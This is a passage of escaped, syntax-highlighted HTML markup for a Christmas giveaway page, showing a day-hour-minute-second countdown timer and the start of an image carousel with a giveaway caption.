style=\"color:#f92672\"\u003ediv\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eclass\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;main-text text-center\u0026#34;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t    \t\t\t\u0026lt;\u003cspan style=\"color:#f92672\"\u003eh2\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eclass\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;sub-text\u0026#34;\u003c/span\u003e\u0026gt;Giveaway countdown\u0026lt;/\u003cspan style=\"color:#f92672\"\u003eh2\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t    \t\t\u0026lt;/\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t    \t\t\u0026lt;\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eclass\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;text-center\u0026#34;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\t\t\t\u0026lt;\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eclass\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;numbers\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eid\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;count2\u0026#34;\u003c/span\u003e\u0026gt;\u0026lt;/\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\t\t\u0026lt;/\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\t\t\u0026lt;\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eclass\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;col-lg-12 col-md-12 col-sm-12 col-xs-12 text-center\u0026#34;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\t\t\t\u0026lt;\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eclass\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;circle text-center\u0026#34;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\t\t\t\t\u0026lt;\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eclass\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;row\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eid\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;spacer1\u0026#34;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\t\t\t\t\t\u0026lt;\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eclass\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;title\u0026#34;\u003c/span\u003e\u0026gt;\u0026lt;/\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\t\t\t\t\t\u0026lt;\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eclass\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;numbers\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eid\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;dday\u0026#34;\u003c/span\u003e\u0026gt;\u0026lt;/\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\t\t\t\t\u0026lt;/\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\t\t\t\t\u0026lt;\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eclass\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;row\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eid\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;spacer2\u0026#34;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\t\t\t\t\t\u0026lt;\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eclass\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;title\u0026#34;\u003c/span\u003e\u0026gt;\u0026lt;/\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\t\t\t\t\t\u0026lt;\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eclass\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;title\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eid\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;days\u0026#34;\u003c/span\u003e\u0026gt;Day\u0026lt;/\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\t\t\t\t\u0026lt;/\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\t\t\t\u0026lt;/\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\t\t\t\u0026lt;\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eclass\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;circle text-center\u0026#34;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\t\t\t\t\u0026lt;\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eclass\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;row\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eid\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;spacer1\u0026#34;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\t\t\t\t\t\u0026lt;\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eclass\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;title\u0026#34;\u003c/span\u003e\u0026gt;\u0026lt;/\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\t\t\t\t\t\u0026lt;\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eclass\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;numbers\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eid\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;dhour\u0026#34;\u003c/span\u003e\u0026gt;\u0026lt;/\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\t\t\t\t\u0026lt;/\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\t\t\t\t\u0026lt;\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eclass\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;row\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eid\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;spacer2\u0026#34;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\t\t\t\t\t\u0026lt;\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eclass\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;title\u0026#34;\u003c/span\u003e\u0026gt;\u0026lt;/\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\t\t\t\t\t\u0026lt;\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eclass\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;title\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eid\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;hours\u0026#34;\u003c/span\u003e\u0026gt;Hr\u0026lt;/\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\t\t\t\t\u0026lt;/\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\t\t\t\u0026lt;/\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\t\t\t\u0026lt;\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eclass\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;circle text-center\u0026#34;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\t\t\t\t\u0026lt;\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eclass\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;row\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eid\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;spacer1\u0026#34;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\t\t\t\t\t\u0026lt;\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eclass\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;title\u0026#34;\u003c/span\u003e\u0026gt;\u0026lt;/\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\t\t\t\t\t\u0026lt;\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eclass\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;numbers\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eid\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;dmin\u0026#34;\u003c/span\u003e\u0026gt;\u0026lt;/\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\t\t\t\t\u0026lt;/\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\t\t\t\t\u0026lt;\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eclass\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;row\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eid\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;spacer2\u0026#34;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\t\t\t\t\t\u0026lt;\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eclass\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;title\u0026#34;\u003c/span\u003e\u0026gt;\u0026lt;/\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\t\t\t\t\t\u0026lt;\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eclass\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;title\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eid\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;minutes\u0026#34;\u003c/span\u003e\u0026gt;Min\u0026lt;/\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\t\t\t\t\u0026lt;/\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\t\t\t\u0026lt;/\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\t\t\t\u0026lt;\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eclass\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;circle text-center\u0026#34;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\t\t\t\t\u0026lt;\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eclass\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;row\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eid\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;spacer1\u0026#34;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\t\t\t\t\t\u0026lt;\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eclass\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;title\u0026#34;\u003c/span\u003e\u0026gt;\u0026lt;/\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\t\t\t\t\t\u0026lt;\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eclass\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;numbers\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eid\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;dsec\u0026#34;\u003c/span\u003e\u0026gt;\u0026lt;/\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\t\t\t\t\u0026lt;/\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\t\t\t\t\u0026lt;\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eclass\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;row\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eid\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;spacer2\u0026#34;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\t\t\t\t\t\u0026lt;\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eclass\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;title\u0026#34;\u003c/span\u003e\u0026gt;\u0026lt;/\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\t\t\t\t\t\u0026lt;\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eclass\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;title\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eid\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;seconds\u0026#34;\u003c/span\u003e\u0026gt;Sec\u0026lt;/\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\t\t\t\t\u0026lt;/\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\t\t\t\u0026lt;/\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\t\t\u0026lt;/\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e\u0026gt;\u003cspan style=\"color:#75715e\"\u003e\u0026lt;!-- end of clock --\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t    \t\u0026lt;/\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e\u0026gt;\u003cspan style=\"color:#75715e\"\u003e\u0026lt;!-- end of timer-circle --\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t    \t\u0026lt;/\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e\u0026gt;\u003cspan style=\"color:#75715e\"\u003e\u0026lt;!-- end of timer --\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t    \t\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t        \u0026lt;\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eclass\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;item active\u0026#34;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t        \t\u0026lt;\u003cspan style=\"color:#f92672\"\u003eimg\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003esrc\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;img/mrBeast.jpg\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ealt\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;First slide\u0026#34;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t        \t\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\t\u0026lt;\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eclass\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;carousel-caption caption\u0026#34;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\t\t\u0026lt;\u003cspan style=\"color:#f92672\"\u003eh1\u003c/span\u003e\u0026gt;The biggest christmas giveaway is on its way...\u0026lt;/\u003cspan style=\"color:#f92672\"\u003eh1\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\t\u0026lt;/\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t        \u0026lt;/\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e\u0026gt;\u003cspan style=\"color:#75715e\"\u003e\u0026lt;!-- end of first item --\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t        \u0026lt;\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eclass\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;item\u0026#34;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t          \t\u0026lt;\u003cspan style=\"color:#f92672\"\u003eimg\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003esrc\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;img/santa.jpg\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ealt\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Second slide\u0026#34;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t          \t\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\t\u0026lt;\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eclass\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;carousel-caption 